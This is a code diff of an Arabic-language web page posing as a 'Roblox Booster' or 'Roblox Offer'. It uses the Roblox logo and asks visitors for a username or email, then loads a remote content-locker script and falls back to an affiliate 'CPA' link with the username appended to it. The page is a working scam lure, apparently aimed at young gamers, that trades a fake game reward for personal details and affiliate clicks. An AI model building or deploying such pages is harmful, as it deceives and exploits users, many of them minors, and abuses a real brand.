@@ -1,111 +1,177 @@
-html
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Roblox Booster</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background: #f8f8f8;
-    display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0;
-  }.container {
-    background: white;
-    padding: 20px 30px;
-    border-radius: 15px;
-    width: 320px;
-    text-align: center;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-  }.header {
-    font-weight: 900;
-    font-size: 28px;
-    color: black;
-    border: 3px solid purple;
-    border-radius: 14px;
-    padding: 5px 0;
-    margin-bottom: 10px;
-    font-family: 'Arial Black', sans-serif;
-  }
-  h2 {
-    margin: 10px 0 5px;
-  }.subtitle {
-    color: purple;
-    letter-spacing: 3px;
-    font-weight: bold;
-    margin-bottom: 15px;
-  }
-  label {
-    font-size: 11px;
-    color: gray;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    display: block;
-    margin-bottom: 5px;
-    text-align: right;
-  }
-  input[type="text"] {
-    width: 100%;
-    padding: 10px;
-    border-radius: 10px;
-    border: 1px solid #ccc;
-    box-sizing: border-box;
-    margin-bottom: 15px;
-  }.platforms {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 20px;
-  }.platform-btn {
-    padding: 10px;
-    border: 1px solid #ccc;
-    border-radius: 12px;
-    background: white;
-    cursor: pointer;
-    font-weight: bold;
-    color: black;
-    min-width: 60px;
-  }.platform-btn:hover {
-    border-color: purple;
-    color: purple;
-  }
-  button.continue-btn {
-    width: 100%;
-    padding: 15px;
-    background: purple;
-    border: none;
-    color: white;
-    font-size: 16px;
-    font-weight: bold;
-    border-radius: 12px;
-    cursor: pointer;
-  }
-  button.continue-btn:hover {
-    background: darkviolet;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Offer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #7a3eff, #4a00e0);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity: 1;}
+    }
+
+    .card {
+      background: #fff;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      animation: fadeUp 1.2s ease;
+    }
+
+    @keyframes fadeUp {
+      from {transform: translateY(30px); opacity: 0;}
+      to {transform: translateY(0); opacity: 1;}
+    }
+
+    .logo img {
+      width: 160px;
+      margin-bottom: 20px;
+    }
+
+    .card h1 {
+      font-size: 26px;
+      margin-bottom: 8px;
+      color: #333;
+    }
+
+    .card h2 {
+      font-size: 15px;
+      font-weight: 400;
+      color: #777;
+      margin-bottom: 25px;
+    }
+
+    .input-box {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+      border: 2px solid #eee;
+      border-radius: 12px;
+      padding: 10px;
+      transition: 0.3s;
+    }
+
+    .input-box:hover {
+      border-color: #7a3eff;
+    }
+
+    .input-box input {
+      border: none;
+      outline: none;
+      flex: 1;
+      font-size: 16px;
+    }
+
+    .platforms {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+      margin-bottom: 25px;
+    }
+
+    .platforms button {
+      background: #f2f2f2;
+      border: none;
+      border-radius: 12px;
+      padding: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-size: 20px;
+    }
+
+    .platforms button:hover {
+      background: #d8c7ff;
+      transform: scale(1.1);
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #7a3eff, #4a00e0);
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 15px;
+      width: 100%;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      transform: scale(1.05);
+      background: linear-gradient(135deg, #5a2bcc, #2e007a);
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px;
+      }
+      .logo img {
+        width: 120px;
+      }
+      .card h1 {
+        font-size: 20px;
+      }
+    }
+  </style>
+
+  <!-- 🔒 كود الكونتنت لوكر -->
+  <script type="text/javascript">
+    var mSDIi_ZdS_URdgbc = {"it":4197555,"key":"00006"};
+  </script>
+  <script src="https://dlk457skl57zp.cloudfront.net/99b38b4.js"></script>
 </head>
 <body>
-  <div class="container">
-    <div class="header">ROBLOX</div>
-    <h2>Roblox</h2>
-    <div class="subtitle">ROBLOX BOOSTER</div>
-    <label for="username">Username:</label>
-    <input type="text" id="username" placeholder="Username" />
-    <label>Your Platform:</label>
-    <div class="platforms">
-      <button class="platform-btn">Win</button>
-      <button class="platform-btn">Xbox</button>
-      <button class="platform-btn">Android</button>
-      <button class="platform-btn">Apple</button>
+  <div class="card">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/16/Roblox_Logo_2022.png" alt="Roblox Logo">
     </div>
-    <button class="continue-btn">CONTINUE</button>
+    <h1>مرحبا بك 👋</h1>
+    <h2>أدخل اسمك واكمل للحصول على العرض</h2>
+
+    <div class="input-box">
+      <input type="text" id="username" placeholder="أدخل اسمك أو الإيميل">
+    </div>
+
+    <div class="platforms">
+      <button>💻</button>
+      <button>🎮</button>
+      <button>📱</button>
+      <button>🍎</button>
+    </div>
+
+    <button class="btn" onclick="openLocker()">استمر</button>
   </div>
 
   <script>
-    document.querySelector('.continue-btn').addEventListener('click', function() {
-      window.location.href = 'https://smrturl.co/ccfa87d';
-    });
+    function openLocker() {
+      let username = document.getElementById("username").value;
+      if(username.trim() === ""){
+        alert("من فضلك أدخل اسمك أو الإيميل");
+        return;
+      }
+      // ✅ فتح الكونتنت لوكر
+      if (typeof _tx === "function") {
+        _tx(); 
+      } else {
+        // fallback: لو ما اشتغل اللـوكر، يوجه لرابط الـCPA
+        window.location.href = "https://smrturl.co/ccfa87d?user=" + encodeURIComponent(username);
+      }
+    }
   </script>
 </body>
 </html>
